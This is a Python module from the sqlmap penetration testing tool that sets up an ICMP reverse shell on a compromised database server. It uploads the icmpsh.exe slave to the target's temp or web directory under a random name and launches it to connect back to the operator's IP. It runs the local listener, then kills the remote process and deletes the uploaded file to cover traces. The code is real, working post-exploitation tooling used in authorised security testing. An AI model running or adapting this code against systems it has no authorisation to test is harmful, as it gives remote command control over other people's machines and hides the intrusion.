#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import os
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster

from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths


class ICMPsh:
    """
    This class defines methods to call icmpsh for plugins.
    """

    def __init__(self):
        self.lhostStr       = None
        self.rhostStr       = None
        self.localIP        = getLocalIP()
        self.remoteIP       = getRemoteIP()
        self.__icmpslave    = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))

    def __selectRhost(self):
        message = "which is the back-end DBMS address? [%s] " % self.remoteIP
        address = readInput(message, default=self.remoteIP)

        return address

    def __selectLhost(self):
        message = "which is the local address? [%s] " % self.localIP
        address = readInput(message, default=self.localIP)

        return address

    def __prepareIngredients(self, encode=True):
        self.lhostStr = self.__selectLhost()
        self.rhostStr = self.__selectRhost()

    def __runIcmpshMaster(self):
        infoMsg = "running icmpsh master locally"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def __runIcmpshSlaveRemote(self):
        infoMsg  = "running icmpsh slave remotely"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self.__icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        self.__randStr = randomStr(lowercase=True)
        self.__icmpslaveRemoteBase = "tmpi%s.exe" % self.__randStr

        if web:
            self.__icmpslaveRemote = "%s/%s" % (self.webDirectory, self.__icmpslaveRemoteBase)
        else:
            self.__icmpslaveRemote = "%s/%s" % (conf.tmpPath, self.__icmpslaveRemoteBase)

        self.__icmpslaveRemote = ntToPosixSlashes(normalizePath(self.__icmpslaveRemote))

        logger.info("uploading icmpsh slave to '%s'" % self.__icmpslaveRemote)

        if web:
            self.webFileUpload(self.__icmpslave, self.__icmpslaveRemote, self.webDirectory)
        else:
            self.writeFile(self.__icmpslave, self.__icmpslaveRemote, "binary", False)

    def icmpPwn(self):
        self.__prepareIngredients()
        self.__runIcmpshSlaveRemote()
        self.__runIcmpshMaster()

        debugMsg  = "icmpsh master exited"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self.__icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self.__icmpslaveRemote)
